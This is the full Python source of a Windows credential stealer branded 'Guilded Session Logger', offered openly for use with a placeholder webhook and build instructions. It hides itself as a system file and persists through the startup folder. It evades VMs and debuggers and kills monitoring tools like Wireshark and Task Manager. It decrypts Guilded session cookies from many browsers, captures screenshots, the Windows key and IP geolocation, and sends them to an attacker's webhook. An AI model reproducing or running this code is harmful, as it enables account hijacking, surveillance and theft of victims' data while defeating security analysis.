# Compiling:
# pyinstaller --noconsole --clean --onefile --icon=NONE --disable-windowed-traceback main.py

# config settings are default set to best options.
config = {
    'webhook': "insert your webhoook here!", # Discord/Guilded webhook here.
    'startup': True, # False, True
    #  Startup will copy the script to startup folder.
    'hide_self': 'Advanced', # False, True, 'Advanced'
    # Advanced hide_self will set the file as a windows system file, and a normal "Show hidden files" won't work
    # This also makes it slightly harder to show it again.
    # Recommended not to use 'Advanced' mode for testing; makes it hard to undo/find.
    'anti_debug': True, # False, True
    # Opens the rickroll if the script is run inside a VM/Sandbox.
    'kill_processes': True, # False, True
    # Attempts to find and kill all programs listed in 'blacklistedPrograms'
    'blackListedPrograms': [ # list[str], list of blacklisted programs. Don't know what this is? Leave it alone.
        "httpdebuggerui",
        "wireshark",
        "fiddler",
        "regedit",
        "cmd",
        "taskmgr",
        "vboxservice",
        "df5serv",
        "processhacker",
        "vboxtray",
        "vmtoolsd",
        "vmwaretray",
        "ida64",
        "ollydbg",
        "pestudio",
        "vmwareuser",
        "vgauthservice",
        "vmacthlp",
        "x96dbg",
        "vmsrvc",
        "x32dbg",
        "vmusrvc",
        "prl_cc",
        "prl_tools",
        "xenservice",
        "qemu-ga",
        "joeboxcontrol",
        "ksdumperclient",
        "ksdumper",
        "joeboxserver"
    ]
}

# imports minimum needed libraries for a smaller file size when compiled
from sqlite3 import connect as sq3connect
from os import getlogin, getenv, path as ospath, system as donotuse_system, walk, name, remove, _exit, sep, rename, makedirs
from threading import Thread, enumerate as enumeratethreads
from shutil import copy2, rmtree
from winreg import OpenKey, QueryValueEx, CloseKey, SetValueEx, REG_SZ, KEY_SET_VALUE, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE
from subprocess import check_output
from asyncio import run
from json import dumps, loads
from sys import argv
from tempfile import mkdtemp
from ctypes import windll
from base64 import b64decode

from Crypto.Cipher import AES # pycryptodome
from httpx import get, post # httpx
from psutil import virtual_memory, cpu_count, disk_usage, process_iter, NoSuchProcess, AccessDenied # psutil
from PIL import ImageGrab # pillow
from win32crypt import CryptUnprotectData # pywin32

def system(cmd):
    '''
    Launches a windowless command.
    '''
    return donotuse_system(f'start /B {cmd}')

class AntiDebug:
    inVM = False

    def __init__(self):
        self.processes = list()

        self.Victim = getlogin()

        self.Victim_pc = getenv("COMPUTERNAME")

        self.blackListedUsers = ["WDAGUtilityAccount", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
                                 "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", ]
        self.blackListedPCNames = ["BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC",
                                   "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
        self.blackListedHWIDS = ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
                                 "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4", ]

        for func in [self.listCheck, self.registryCheck, self.specsCheck]:
            process = Thread(target=func, daemon=True)
            self.processes.append(process)
            process.start()
        for t in self.processes:
            try:
                t.join()
            except RuntimeError:
                continue

    def programExit(self):
        self.__class__.inVM = True

    def programKill(self, proc):
        try:
            system(f"taskkill /F /T /IM {proc}")
        except (PermissionError, InterruptedError, ChildProcessError, ProcessLookupError):
            pass

    def listCheck(self):
        for path in [r'D:\Tools', r'D:\OS2', r'D:\NT3X']:
            if ospath.exists(path):
                self.programExit()

        for user in self.blackListedUsers:
            if self.Victim == user:
                self.programExit()

        for pcName in self.blackListedPCNames:
            if self.Victim_pc == pcName:
                self.programExit()

        try:
            myHWID = check_output(
                r"wmic csproduct get uuid", creationflags=0x08000000).decode().split('\n')[1].strip()
        except Exception:
            myHWID = ""
        for hwid in self.blackListedHWIDS:
            if myHWID == hwid:
                self.programExit()

    def specsCheck(self):
        ram = str(virtual_memory()[0]/1024 ** 3).split(".")[0]
        if int(ram) <= 3:  # 3gb or less ram
            self.programExit()
        disk = str(disk_usage('/')[0]/1024 ** 3).split(".")[0]
        if int(disk) <= 50:  # 50gb or less disc space
            self.programExit()
        if int(cpu_count()) <= 1:  # 1 or less cpu cores
            self.programExit()

    def registryCheck(self):
        reg1 = donotuse_system( # cause start /B breaks this
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = donotuse_system( # cause start /B breaks this
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
        if (reg1 and reg2) != 1:
            self.programExit()

        handle = OpenKey(HKEY_LOCAL_MACHINE,
                                'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
        try:
            reg_val = QueryValueEx(handle, '0')[0]

            if ("VMware" or "VBOX") in reg_val:
                self.programExit()
        finally:
            CloseKey(handle)

class GuildedLogger:
    def __init__(self):
        self.webhook = config.get('webhook')
        self.appdata = getenv("localappdata")
        self.roaming = getenv("appdata")
        self.dir = mkdtemp()
        self.startup_loc = self.roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

        self.sep = sep
        self.fc = []

        makedirs(self.dir, exist_ok=True)

    def try_catch(func):
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception as e:
                import traceback
                print(''.join(traceback.format_exception(e, e, e.__traceback__)))
        return wrapper

    def startup(self):
        try:
            copy2(argv[0], self.startup_loc)
        except Exception:
            pass
    
    def hide(self):
        if config.get('hide_self') == True:
            windll.kernel32.SetFileAttributesW(argv[0], 2)
        elif type(config.get('hide_self')) == str and config.get('hide_self').lower() == 'advanced':
            windll.kernel32.SetFileAttributesW(argv[0], 6)

    async def init(self):
        if config.get('anti_debug'):
            if AntiDebug().inVM:
                rickroll_url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" # har har har ANTIVM go brrr
                system(f"start {rickroll_url}")
                _exit(0)
        function_list = [self.screenshot, self.grabCookies]
        if config.get('hide_self'):
            function_list.append(self.hide)
        if config.get('startup') == True:
            function_list.append(self.startup)
        if config.get('kill_processes'):
            await self.killProcesses()
        for func in function_list:
            process = Thread(target=func, daemon=True)
            process.start()
        for t in enumeratethreads():
            try:
                t.join()
            except RuntimeError:
                continue
        self.finish()
        rmtree(self.dir)

    async def killProcesses(self):
        blackListedPrograms = config.get('blackListedPrograms')
        for proc in process_iter():
            if any(procstr in proc.name().lower() for procstr in blackListedPrograms):
                try:
                    proc.kill()
                except (NoSuchProcess, AccessDenied):
                    pass

    def getProductValues(self):
        try:
            wkey = check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
        except Exception:
            wkey = "N/A (Likely Pirated)"
        try:
            productName = check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", creationflags=0x08000000).decode().rstrip()
        except Exception:
            productName = "N/A"
        return [productName, wkey]
    
    def decrypt_cookie(self, encrypted, path) -> str:
        def get_master_key(path) -> str:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = loads(c)

            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        master_key = get_master_key(path)
        try:
            iv = encrypted[3:15]
            payload = encrypted[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    @try_catch
    def grabCookies(self):
        cookies = []
        paths = {
            'Guilded': self.roaming + r'\\Guilded\\Network\\Cookies',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Network\\Cookies',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Network\\Cookies',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Default\\Network\\Cookies', # Unverified Cookies Path
            'Torch': self.appdata + r'\\Torch\\User Data\\Default\\Network\\Cookies', # Unverified Cookies Path
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Default\\Network\\Cookies', # Unverified Cookies Path
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Default\\Network\\Cookies', # Unverified Cookies Path
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Default\\Network\\Cookies', # Unverified Cookies Path
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Default\\Network\\Cookies', # Unverified Cookies Path
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Default\\Network\\Cookies', # Unverified Cookies Path
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Network\\Cookies', # Unverified Cookies Path
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Default\\Network\\Cookies', # Unverified Cookies Path
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Network\\Cookies', # Unverified Cookies Path
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Network\\Cookies', # Unverified Cookies Path
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Network\\Cookies' # Unverified Cookies Path
        }

        for name, path in paths.items():
            try:
                if not ospath.exists(path):
                    continue
                if name == 'Guilded': # unencrypted cookies
                    conn = sq3connect(path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT * FROM cookies")
                    cookie_records = cursor.fetchall()
                    cursor.close()
                    conn.close()
                    for record in cookie_records:
                        name, value, domain = record[3], record[4], record[1]
                        if 'hmac_signed_session' in name:
                            cookies.append(value)
                else:
                    lsmap = {
                        'Microsoft Edge': self.appdata+'\\Microsoft\\Edge\\User Data\\Local State',
                        'Opera GX': self.roaming+'\\Opera Software\\Opera GX Stable\\Local State',
                        'Opera': self.roaming+'\\Opera Software\\Opera Stable\\Local State',
                        'Brave': self.appdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Local State',
                        'Iridium': self.appdata+'\\Iridium\\User Data\\Local State', # Unverified Local State path
                        'Yandex': self.appdata +'\\Yandex\\YandexBrowser\\User Data\\Local State', # Unverified Local State path
                        'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Local State', # Unverified Local State Path
                        'Amigo': self.appdata + '\\Amigo\\User Data\\Default\\Local State', # Unverified Local State Path
                        'Torch': self.appdata + '\\Torch\\User Data\\Default\\Local State', # Unverified Local State Path
                        'Kometa': self.appdata + '\\Kometa\\User Data\\Default\\Local State', # Unverified Local State Path
                        'Orbitum': self.appdata + '\\Orbitum\\User Data\\Default\\Local State', # Unverified Local State Path
                        'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Default\\Local State', # Unverified Local State Path
                        '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Default\\Local State', # Unverified Local State Path
                        'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Default\\Local State', # Unverified Local State Path
                        'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local State', # Unverified Local State Path
                        'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Default\\Local State' # Unverified Local State Path
                    }
                    localstate = lsmap[name]
                    conn = sq3connect(path)
                    cursor = conn.cursor()
                    domain = '.guilded.gg'
                    cursor.execute("SELECT * FROM cookies WHERE host_key LIKE ?", ('%'+domain+'%',))
                    cookie_records = cursor.fetchall()
                    cursor.close()
                    conn.close()
                    for record in cookie_records:
                        name, encrypted_value = record[3], record[5]
                        if 'hmac_signed_session' in name:
                            value = self.decrypt_cookie(encrypted_value, localstate)
                            cookies.append(value)
            except:
                pass
        
        try:
            if ospath.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for path, _, files in walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                    for _file in files:
                        if not _file == 'cookies.sqlite':
                            continue
                        conn = sq3connect(path + '\\cookies.sqlite')
                        cursor = conn.cursor()
                        domain = '.guilded.gg'
                        cursor.execute("SELECT name, value FROM moz_cookies WHERE host = ?", (domain,))
                        cookie_records = cursor.fetchall()
                        cursor.close()
                        conn.close()
                        for record in cookie_records:
                            name, value = record[0], record[1]
                            if 'hmac_signed_session' in name:
                                cookies.append(value)
        except:
            pass

        try:
            if ospath.exists(self.appdata + "\\Google\\Chrome\\User Data"):
                for path, _, files in walk(self.appdata+"\\Google\\Chrome\\User Data\\"):
                    for _file in files:
                        if not _file == 'Cookies':
                            continue
                        conn = sq3connect(path+'\\Cookies')
                        cursor = conn.cursor()
                        domain = '.guilded.gg'
                        cursor.execute("SELECT * FROM cookies WHERE host_key LIKE ?", ('%'+domain+'%',))
                        cookie_records = cursor.fetchall()
                        cursor.close()
                        conn.close()
                        for record in cookie_records:
                            name, encrypted_value = record[3], record[5]
                            if 'hmac_signed_session' in name:
                                value = self.decrypt_cookie(encrypted_value, self.appdata+'\\Google\\Chrome\\User Data\\Local State')
                                cookies.append(value)
        except:
            pass

        try:
            if ospath.exists(self.appdata + "\\Google\\Chrome SxS\\User Data"):
                for path, _, files in walk(self.appdata+"\\Google\\Chrome SxS\\User Data\\"):
                    for _file in files:
                        if not _file == 'Cookies':
                            continue
                        conn = sq3connect(path+'\\Cookies')
                        cursor = conn.cursor()
                        domain = '.guilded.gg'
                        cursor.execute("SELECT * FROM cookies WHERE host_key LIKE ?", ('%'+domain+'%',))
                        cookie_records = cursor.fetchall()
                        cursor.close()
                        conn.close()
                        for record in cookie_records:
                            name, encrypted_value = record[3], record[5]
                            if 'hmac_signed_session' in name:
                                value = self.decrypt_cookie(encrypted_value, self.appdata+'\\Google\\Chrome SxS\\User Data\\Local State')
                                cookies.append(value)
        except:
            pass
        
        cookies = list(set(map(str.strip, cookies)))
        for cookie in cookies:
            vc = self.verifycookie(cookie)
            if vc:
                self.fc.append([cookie, vc['user']['name'], vc['user']['id'], vc['user']['email']])


    def screenshot(self):
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save(self.dir + "\\SPOILER_Screenshot.png")
        image.close()

    def finish(self):
        Victim = getlogin()
        Victim_pc = getenv("COMPUTERNAME")
        w = self.getProductValues()
        wname = w[0].replace(" ", "᠎ ")
        wkey = w[1].replace(" ", "᠎ ")
        ram = str(virtual_memory()[0]/1024 ** 3).split(".")[0]
        disk = str(disk_usage('/')[0]/1024 ** 3).split(".")[0]
        # IP, country, city, region, google maps location
        data = get("https://ipinfo.io/json").json()
        ip = data.get('ip')
        city = data.get('city')
        country = data.get('country')
        region = data.get('region')
        org = data.get('org')
        googlemap = "https://www.google.com/maps/search/google+map++" + \
            data.get('loc')
        cfc = []
        if self.fc:
            for c in self.fc:
                cfc.append(f'{c[0]}\n{c[1]} ({c[2]}) - {c[3]}')
            cfc = '\n\n'.join(cfc)
        else:
            cfc = None
        file_path = self.dir + '\\SPOILER_Screenshot.png'
        with open(file_path, 'rb') as file:
            image_data = file.read()
        embed = {
            'username': 'Guilded Session Logger',
            'avatar_url': 'https://i.kym-cdn.com/entries/icons/original/000/000/091/TrollFace.jpg',
            'embeds': [
                {
                    'author': {
                        'name': f'{Victim} just got their cookies stolen!',
                        'url': 'https://github.com/Guilded-Tools/GuildedSessionLogger',
                        'icon_url': 'https://i.kym-cdn.com/entries/icons/original/000/000/091/TrollFace.jpg'
                    },
                    'color': 16119101,
                    'description': f'[Google Maps Location]({googlemap})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                                IP:᠎ {ip.replace(" ", "᠎ ") if ip else "N/A"}
                                Org:᠎ {org.replace(" ", "᠎ ") if org else "N/A"}
                                City:᠎ {city.replace(" ", "᠎ ") if city else "N/A"}
                                Region:᠎ {region.replace(" ", "᠎ ") if region else "N/A"}
                                Country:᠎ {country.replace(" ", "᠎ ") if country else "N/A"}```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                                PCName: {Victim_pc.replace(" ", "᠎ ")}
                                WinKey:᠎ {wkey}
                                Platform:᠎ {wname}
                                DiskSpace:᠎ {disk}GB
                                Ram:᠎ {ram}GB```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '**Cookies:**',
                            'value': f'''```yaml
                                {cfc if cfc else "No cookies extracted"}```
                            '''.replace(' ', ''),
                            'inline': False
                        }
                    ],
                    'footer': {
                        'text': '🌟・Session Logger by justsomeone・https://github.com/Guilded-Tools/GuildedSessionLogger'
                    }
                }
            ]
        }
        files = {
            'payload_json': (None, dumps(embed), 'application/json'),
            'file': (ospath.basename(file_path), image_data)
        }
        post(self.webhook, files=files)

    def verifycookie(self, cookie):
        cookies = [
            ("hmac_signed_session", cookie),
            ("authenticated", "true"),
            ("gk", "electron_background_worker_watchdog%2Cuse_rtc_voice_connection%2Cmultiple_files_drag_drop%2Cshow_ptt_warning_banner%2Cnative_reaction_motion%2Cenable_progressive_image_uri_string%2Cenable_async_reactions%2Cnative_emotes_settings_screen%2Cserver_subs_prevent_native_subscribe_flow_ios%2Cenable_remove_reactions%2Cwebview_inject_cookies_disabled%2Cnative_audit_log_screen%2Candroid_soft_haptic_feedback%2Cenable_media_renderer_from_alternate_srcs%2Cwebrtc_vad%2Cmentionables_v2%2Cenable_scrollbar_v2%2Cwhimsical_bot_icons%2Cpause_stream_preview_unfocused%2Cnative_loopback_capture%2Crole_icon%2Creaction_picker_navbar_on_native%2Cmobile_virtualized_sidebar%2Cstyle_ios_text_input%2Cstyle_android_text_input%2Ccan_edit_socket_permissions%2Cyt_allow_custom_name%2Cchat_message_context_menu%2Cprofile_hover_card_v3%2Cpartner_program_v2%2Cvideo_streaming_pip_view_enabled%2Cshow_game_presence%2Cnative_update_app_overlay")
        ]
        payload = {
            "isLogin": "false",
            "v2": "true"
        }
        headers = {
            "authority": "www.guilded.gg",
            "method": "GET",
            "path": "/api/me?isLogin=false&v2=true",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "referer": "https://www.guilded.gg/",
            "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "x-requested-with": "XMLHttpRequest"
        }
        a = get('https://www.guilded.gg/api/me?isLogin=false&v2=true', params=payload, cookies=dict(cookies), headers=headers)
        if a.status_code == 200:
            return a.json()
        return False

if __name__ == "__main__" and name == "nt":
    try:
        run(GuildedLogger().init())
    except:
        pass
